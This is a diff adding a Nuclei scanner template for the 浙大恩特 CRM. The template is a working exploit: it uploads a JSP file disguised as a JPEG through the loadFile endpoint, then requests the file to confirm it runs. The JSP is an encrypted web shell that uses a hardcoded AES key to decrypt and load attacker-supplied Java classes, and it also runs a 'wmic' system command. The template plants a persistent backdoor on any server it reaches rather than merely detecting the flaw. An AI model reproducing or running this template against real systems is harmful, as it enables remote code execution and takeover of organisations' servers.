@@ -1,0 +1,83 @@
+id: zhedaCRM
+info:
+  name: 浙大恩特CRM
+  author: mike
+  severity: info
+  description: 浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: 浙大恩特
+http:
+  - raw:
+      - |
+        POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
+        Content-Length: 208
+
+        ------WebKitFormBoundarye8FPHsIAq9JN8j2A
+        Content-Disposition: form-data; name="file";filename="mikes.jsp"
+        Content-Type: image/jpeg
+
+        <%@ page import="java.io.*" %>
+        <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
+            <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
+                super.defineClass(b,0,b.length);}}%>
+                <%if (request.getMethod().equals("POST")) {String k="e45e329feb5d925b"
+                    ;session.putValue("u",k); Cipher
+                    c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES")); new
+                    U(this.getClass().getClassLoader()).g(c.doFinal(new
+                    sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
+                    <%out.print("hello friend, you got it");%>
+                    <%
+            String command = "wmic computersystem get domain";
+            Process process = Runtime.getRuntime().exec(command);
+
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+              out.println("output:"+line);
+            }
+            process.waitFor();
+            %>
+        ------WebKitFormBoundarye8FPHsIAq9JN8j2A--
+      - |
+        GET {{filepath}} HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+  
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "friend"
+
+    extractors:
+      - type: json # type of the extractor
+        part: body
+        name: filepath
+        internal: true # Required for using dynamic variables
+        json:
+          - '.filepath'  # JQ like syntax for extraction
+
+      - type: regex # type of the extractor
+        part: body
+        name: outp
+        group: 1
+        regex:
+          - "output:(.*)"  # JQ like syntax for extraction
+
+      - type: dsl  # type of the extractor
+        dsl:
+          - outp # dsl expression value to extract from response
+
+        # <%out.print("hello friend, you got it");%>
